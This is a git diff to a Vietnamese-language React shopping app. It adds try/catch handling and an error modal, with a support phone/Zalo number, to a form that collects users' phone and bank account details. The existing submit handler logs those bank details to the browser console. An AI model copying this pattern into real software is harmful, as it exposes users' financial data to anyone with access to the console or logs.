@@ -32,6 +32,8 @@ function App() {
   const [showModal, setShowModal] = useState(false);
   const [orderId, setOrderId] = useState("");
   const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [showErrorModal, setShowErrorModal] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
 
   const handleProcessLink = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -79,19 +81,26 @@ function App() {
     };
     console.log("Bank Information Submitted:", formData);
 
-    const res = await saveInfo(formData);
+    try {
+      const res = await saveInfo(formData);
 
-    // Reset form
-    setPhone("");
-    setBankName("");
-    setAccountNumber("");
-    setAccountName("");
-    setOrderId("");
+      // Reset form
+      setPhone("");
+      setBankName("");
+      setAccountNumber("");
+      setAccountName("");
+      setOrderId("");
 
-    setShowModal(false);
+      setShowModal(false);
 
-    // Show success modal
-    setShowSuccessModal(true);
+      // Show success modal
+      setShowSuccessModal(true);
+    } catch (err: any) {
+      // Show error message to user in custom modal
+      setErrorMessage(err.message || "Đã xảy ra lỗi khi lưu thông tin");
+      setShowErrorModal(true);
+      setShowModal(false);
+    }
   };
 
   return (
@@ -410,6 +419,71 @@ function App() {
             >
               <Check size={20} />
               Đã hiểu, tiếp tục mua sắm
+            </button>
+          </div>
+        </div>
+      )}
+      {/* Error Modal */}
+      {showErrorModal && (
+        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center px-4">
+          <div className="bg-gradient-to-br from-red-900/90 via-gray-900 to-black border border-red-500/30 rounded-3xl p-8 max-w-lg w-full shadow-2xl animate-in zoom-in-95 duration-200">
+            {/* Error Icon */}
+            <div className="text-center mb-6">
+              <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-r from-red-500 to-rose-500 rounded-full mb-4 shadow-lg shadow-red-500/30">
+                <X size={40} className="text-white" />
+              </div>
+              <h2 className="text-2xl font-bold text-white mb-2">
+                ⚠️ Không Thể Ghi Nhận
+              </h2>
+              <p className="text-red-400 font-medium">Đơn hàng đã tồn tại</p>
+            </div>
+
+            {/* Error Message */}
+            <div className="bg-black/30 rounded-2xl p-6 mb-6 border border-red-500/20">
+              <div className="flex items-start gap-3 mb-4">
+                <div className="p-2 bg-red-500/20 rounded-lg mt-1">
+                  <Package size={20} className="text-red-400" />
+                </div>
+                <div>
+                  <p className="text-white text-base leading-relaxed mb-3">
+                    {errorMessage}
+                  </p>
+                </div>
+              </div>
+
+              <div className="bg-gradient-to-r from-yellow-500/10 to-orange-500/10 border border-yellow-500/20 rounded-xl p-4">
+                <div className="flex items-start gap-3">
+                  <div className="p-1 bg-yellow-500/20 rounded-lg">
+                    <Phone size={16} className="text-yellow-400" />
+                  </div>
+                  <div>
+                    <h4 className="text-yellow-400 font-medium text-sm mb-1">
+                      Liên hệ hỗ trợ:
+                    </h4>
+                    <p className="text-white text-sm font-semibold">
+                      SĐT / Zalo:{" "}
+                      <a
+                        href="tel:0967034098"
+                        className="text-blue-400 hover:text-blue-300 underline"
+                      >
+                        096 703 4098
+                      </a>
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Action Button */}
+            <button
+              onClick={() => {
+                setShowErrorModal(false);
+                setErrorMessage("");
+              }}
+              className="w-full bg-gradient-to-r from-red-500 to-rose-500 hover:from-red-600 hover:to-rose-600 text-white font-bold py-4 rounded-xl transition-all active:scale-95 shadow-lg shadow-red-500/30 flex items-center justify-center gap-2"
+            >
+              <X size={20} />
+              Đóng
             </button>
           </div>
         </div>
